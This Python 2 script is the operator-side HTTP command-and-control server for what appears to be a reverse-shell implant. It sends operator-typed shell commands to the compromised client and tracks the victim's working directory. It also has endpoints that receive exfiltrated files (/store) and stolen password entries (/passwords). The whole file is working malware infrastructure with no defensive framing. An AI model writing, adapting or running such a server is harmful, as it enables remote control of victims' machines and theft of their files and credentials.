import BaseHTTPServer
import os
import cgi
import json
from pprint import pprint

#HOST = '10.10.10.100'
HOST = '192.168.1.97'
PORT = 8080

YES_OPTIONS = ('y', 'yes')
CWD = ''

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        global CWD

        if not CWD:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write('cd')
        else:
            cmd = raw_input('\n{CWD}> '.format(CWD=CWD))
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(cmd)

    def do_POST(self):
        global CWD

        if not CWD or self.path == '/cwd':
            self.send_response(200)
            self.end_headers()
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)
            CWD = data.split('Changed dir to ')[-1].strip()
        else:
            if self.path == '/store':
                try:
                    ctype, _ = cgi.parse_header(self.headers.getheader('content-type'))
                    if ctype == 'multipart/form-data':
                        fs = cgi.FieldStorage(fp=self.rfile,
                                              headers=self.headers,
                                              environ={'REQUEST_METHOD': 'POST'})
                    else:
                        print '[-] Got an unexpected POST request'
                        self.send_response(500)
                        self.end_headers()
                        return

                    for k in fs.keys():
                        fs_up = fs[k]
                        filename = os.path.basename(k)
                        if os.path.exists(filename):
                            print '[!] File with same name ({filename}) already exists'.format(filename=filename)
                            overwrite = raw_input('Would you like to overwrite the existing file? [y/n]')
                            if overwrite.lower() in YES_OPTIONS:
                                os.remove(filename)
                                print 'Overwriting file...'
                            else:
                                print 'Skipping...'

                        if not os.path.exists(filename):
                            with open(filename, 'wb') as f:
                                f.write(fs_up.file.read())

                            print 'Got {} successfully!'.format(filename)
                    self.send_response(200)
                    self.end_headers()
                except Exception as e:
                    print e
            elif self.path == '/passwords':
                self.send_response(200)
                self.end_headers()
                length = int(self.headers['Content-Length'])
                data = self.rfile.read(length)
                formatted = json.loads(data)
                print
                for entry in formatted:
                    pprint(entry)
                    print
            else:
                self.send_response(200)
                self.end_headers()
                length = int(self.headers['Content-Length'])
                data = self.rfile.read(length)
                print
                print data

if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST, PORT), MyHandler)

    try:
        print '[!] Server is listening on {host}:{port}'.format(host=HOST, port=PORT)
        httpd.serve_forever()
    except KeyboardInterrupt:
        print '[!] Server is terminated'
